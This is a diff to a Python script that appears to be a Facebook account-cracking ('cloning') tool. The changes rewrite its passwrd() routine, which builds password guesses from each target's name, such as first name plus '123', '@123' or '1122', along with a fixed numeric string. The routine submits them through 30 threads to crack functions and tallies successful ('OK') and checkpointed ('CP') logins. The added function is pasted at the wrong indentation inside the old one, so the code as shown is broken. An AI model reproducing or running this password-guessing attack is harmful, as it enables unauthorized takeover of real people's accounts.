@@ -511,55 +511,75 @@ def passwrd():
 			if len(nmf)<6:
 				if len(frs)<3:
 					pass
-				else:
-					pwv.append(nmf)
-					pwv.append(frs+'123')
-					pwv.append(frs+'1234')
-					pwv.append(frs+'12345')
-					pwv.append(frs+'123456')
-					pwv.append(frs+'123456789')
-					pwv.append(frs+'1234567890')
-					pwv.append(frs+'12')
-					pwv.append(frs+'1122')
-					pwv.append(frs+'321')
-					pwv.append(frs+'54321')
-					pwv.append('123'+frs+'123')
-					pwv.append('1234'+frs+'1234')
-					pwv.append('12345'+frs+'12345')
-					pwv.append('123'+frs)
-					pwv.append('1234'+frs)
-					pwv.append('12345'+frs)
-			else:
-				if len(frs)<3:
-					pwv.append(nmf)
-				else:
-					pwv.append(nmf)
-					pwv.append(frs+'123')
-					pwv.append(frs+'1234')
-					pwv.append(frs+'12345')
-					pwv.append(frs+'123456')
-					pwv.append(frs+'123456789')
-					pwv.append(frs+'1234567890')
-					pwv.append(frs+'12')
-					pwv.append(frs+'1122')
-					pwv.append(frs+'321')
-					pwv.append(frs+'54321')
-					pwv.append('123'+frs+'123')
-					pwv.append('1234'+frs+'1234')
-					pwv.append('12345'+frs+'12345')
-					pwv.append('123'+frs)
-					pwv.append('1234'+frs)
-					pwv.append('12345'+frs)
-			if 'ya' in pwpluss:
-				for xpwd in pwnya:
-					pwv.append(xpwd)
-			else:pass
-			if 'mobile' in method:
-				pool.submit(crackmobile_KAKTARANI,idf,pwv,nmf)
-			elif 'mbasic' in method:
-				pool.submit(crackmbasic_KAKTARANI,idf,pwv,nmf)
-			else:
-				pool.submit(crackmbasic,idf,pwv,nmf)
+			def passwrd():
+    os.system('clear')
+    print(logo)
+    print(f"\033[97;1m[\033[92;1m+\033[97;1m] \033[1;92mUSER NAME\033[1;91m :\033[1;96m "+uname)
+    print("\033[97;1m[\033[92;1m•\033[97;1m] \033[10;93mTODAY'S DATE :\033[1;92m "+date)
+    print('\033[97;1m[\033[92;1m+\033[97;1m] \033[1;92mHamu ID To \033[0;97m:\033[1;92m ',str(len(id)))
+    print("\033[97;1m[\033[92;1m•\033[97;1m] \x1b[38;5;208mCrack Dasty Pekrd La\033[0;97m :> \033[1;92m"+time.strftime("%H:%M")+" "+ tag)
+    print("\033[97;1m[\033[92;1m+\033[97;1m] \033[10;95mCLONING SPEED SUPER FAST-!✅")
+    print(f'\033[97;1m[\033[92;1m•\033[97;1m] \033[1;92mUSE FLIGHT MODE FOR SPEED UP ')
+    print('\033[0;97m===============================================')
+    with tred(max_workers=30) as pool:
+        for yuzong in id2:
+            idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
+            frs = nmf.split(' ')[0]
+            pwv = []
+            if len(nmf)<6:
+                if len(frs)<3:
+                    pass
+                else:
+                    pwv.append(frs+'12')
+                    pwv.append(frs+'123')
+                    pwv.append(frs+'1234')
+                    pwv.append(frs+'12345')
+                    pwv.append(frs+'123456')
+                    pwv.append(nmf)
+                    pwv.append('57273200')
+                    pwv.append(frs+'@123')
+                    pwv.append(frs+'@')
+                    pwv.append(frs+'@@')
+                    pwv.append(frs+'@@@')
+                    pwv.append(frs+'@@@@')
+                    pwv.append(frs+'@#')
+                    pwv.append(frs+'1122')
+                    pwv.append(frs+'11')
+                    pwv.append(frs+'111')
+            else:
+                if len(frs)<3:
+                    pwv.append(nmf)
+                else:
+                    pwv.append(frs+'12')
+                    pwv.append(frs+'123')
+                    pwv.append(frs+'1234')
+                    pwv.append(frs+'12345')
+                    pwv.append(frs+'123456')
+                    pwv.append(nmf)
+                    pwv.append('57273200')
+                    pwv.append(frs+'@123')
+                    pwv.append(frs+'@')
+                    pwv.append(frs+'@@')
+                    pwv.append(frs+'@@@')
+                    pwv.append(frs+'@@@@')
+                    pwv.append(frs+'@#')
+                    pwv.append(frs+'1122')
+                    pwv.append(frs+'11')
+                    pwv.append(frs+'111')
+            if 'ya' in pwpluss:
+                for xpwd in pwnya:
+                    pwv.append(xpwd)
+            else:pass
+            if 'mobile' in method:
+                pool.submit(crack,idf,pwv)
+            elif 'free' in method:
+                pool.submit(crackfree,idf,pwv)
+            elif 'touch' in method:
+                pool.submit(crackfree,idf,pwv)
+            elif 'mbasic' in method:
+                pool.submit(crackfree,idf,pwv)
+            else:
+                pool.submit(crackfree,idf,pwv)
 	print(f'{N}╭───[{b}•{x}]{h} OK : {h}%s '%(ok))
 	print(f'{N}├───{x}[{b}•{x}]{k} CP : {k}%s{x} '%(cp))
 	print('│')
